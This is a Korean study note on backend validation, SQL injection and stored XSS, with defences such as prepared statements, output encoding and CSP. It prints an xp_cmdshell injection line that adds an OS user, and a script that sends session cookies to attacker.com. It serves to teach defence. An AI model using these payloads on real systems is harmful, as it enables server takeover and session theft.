
### 현대 구조 

- Front - Back 이 분리된 분산 시스템 구조를 기반으로 한다. 
- 이러한 변화는 보안의 문제를 발생하게 되었다. 

### 데이터 무결성 검증 책임을 FRONT에만 의존하면??

- SQL 인젝션, 크로스사이트 스크립팅(XSS), 비즈니스 로직 우회와 같은 치명적인 공격 벡터에 노출시킨다. 
- FRONT 에서의 유효성 검사 로직은 보통 불필요한 트래픽 부하를 줄이는데 목적이 있지, 보안 통제 수단으로는 쓸모가 없다. 

### 어떻게 공격할까? 

- 공격시 가장 빈번하게 사용하는 기법은 Burp Suite, OWASP ZAP과 같은 인터셉션 프록시를 활용하는 것. 
- 인터셉션 프록시들은 브라우저와 서버간의 트래픽을 가로채서 HTTP 요청의 헤더와 바디를 자유롭게 수정할 수 있게 해줌. 
	- 공격 시나리오 
		- 정상적인 사용자는 브라우저의 폼을 통해서 데이터를 입력하여 검증 통과. 
		- 브라우저가 서버로 요청을 전송하는 순간 공격자는 프록시 도구에서 해당 요청을 일시정지 시킨다. 
		- 이후에 price 파라미터 값을 변경, quantity 값을 조작, SQL 삽입 등을 수행한후 서버에 전송. 
		- 이래서 Backend 에서 이 요청이 변질되었는지 검증하지 않으면 심각한 문제가 발생할 수 있다. 


### [[SQL 인젝션]]

- 신뢰할 수 없는 데이터가 애플리케이션의 데이터베이스 쿼리 구문으로 해석될 때 발생하는 치명적인 취약점 
- Backend에서 입력값에 대한 엄격한 타입 검증이나, 이스케이프 처리가 없을경우 공격자는 쿼리 구조 자체를 변경해서 데이터 유출, 변조, 서버의 제어권 탈취 가능. 
- 심지어 운영체제 레벨의 명령어를 실행할 수 있다고 함. 
> ; exec xp_cmdshell 'net user hacker Password123 /add'
- 새로운 관리자 계정을 생성하거나, 랜섬웨어를 다운로드해서 실행하는게 가능. 


### 그러면 이 SQL 인젝션 어떻게 방어해

- Prepared Statements( 준비된 구문을 사용 )
	
	- 쿼리의 구조(SQL 코드)와 데이터를 분리해서 데이터 베이스에 전달한다. 
	- DB 엔진은 입력값을 단순한 데이터 리터럴로 처리해서 어떠한 경우에도 이를 SQL 명령어로 해석하지 않는다!!! 

> [!important] 핵심!!
> 보통 생기는 문제는 OR, ADD, DROP 같은 쿼리 명령어를 사용할떄 문제가 생긴다. 
이를 방지하고자, ? 로 바인딩시켜서 명령어로 취급이 아닌 일반 String 으로 인식하게끔 해서 의도하지 않은 동작을 예방하는 것이 핵심이다! 


### [[XSS (Cross-Site Scripting)]]

- 공격자가 작성한 악성 자바 스크립트가 데이터베이스에 영구적으로 저장되었다가 해당 데이터를 조회하는 모든 일반 사용자의 브라우저에서 실행되는 형태. 

##### 공격 과정 

- 주입 : 
	- 공격자는 게시판, 댓글, 프로필 필드에 
```
<script>fetch('https://attacker.com?cookie='+document.cookie)</script>
```
- 이런식으로 스크립트를 입력한다. 
- 저장 : 
	- 입력값에 포함된 특수 문자 등을 필터링, 인코딩을 하지 않은채로 DB에 저장한다면? 
- 실행 : 
	- 정상적인 사용자가 해당 게시물을 열람할 때, 서버는 데이터베이스에 저장된 스크립트를 HTML 응답에 포함시켜서 보내버린다. 
	- 그러면 피해자의 브라우저는 이를 정상적인 스크립트로 인식하여 실행되어서 피해자의 세션 쿠키가 공격자에게 전송되는 것. 


##### 이를 통해서 생길수 있는 문제

- 세션 하이재킹 
	- 탈취한 세션 ID를 이용해서 공격자는 피해자의 계정에 로그인 없이 접근 가능. 
- CSRF 연계
	- 공격자는 피해자의 권한으로 원치 않는 동작을 수행하는 요청을 백그라운드에서 전송 가능. 
- 피싱 
	- 스크립트를 통해서 가짜 로그인 모달 창을 띄워 사용자의 비밀번호 입력을 유도 가능. 

### 그래서 어떻게 방지해? 

- XSS 방어를 위해서는 입력값 검증 뿐 아니라 데이터를 브라우저로 출력하는 시점에 인코딩을 수행해야함. 

>HTML 본문에 데이터를 출력할 때는 `<`를 `&lt;`로 변환
>자바스크립트 변수 내에 출력할 때는 유니코드 이스케이프(`\u003C`)를 적용

- 추가적으로 컨텐츠 보안 정책(CSP) 헤더를 설정해서 신뢰할 수 없는 도메인에서의 스크립트 로딩을 브라우저 수준에서 차단해야함.
